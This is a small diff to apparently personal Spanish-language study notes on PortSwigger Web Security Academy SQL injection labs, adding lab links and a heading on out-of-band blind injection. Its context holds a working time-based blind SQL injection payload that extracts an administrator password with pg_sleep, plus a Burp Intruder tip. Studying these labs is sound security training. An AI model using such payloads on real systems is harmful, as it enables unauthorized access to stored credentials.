@@ -192,5 +192,9 @@ https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-
 x'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
 
 COn el intruder de burp, podemos agregar dentro del menu columns la columna "response reseived". Las columnas con mayor tiempo (por amplia diferencia) son aquellas cuyo char sea verdadero.
+https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-time-delays/sql-injection/blind/lab-time-delays-info-retrieval#
+
+###################Blind sqli out of band
+https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-using-out-of-band-oast-techniques/sql-injection/blind/lab-out-of-band#
 
 
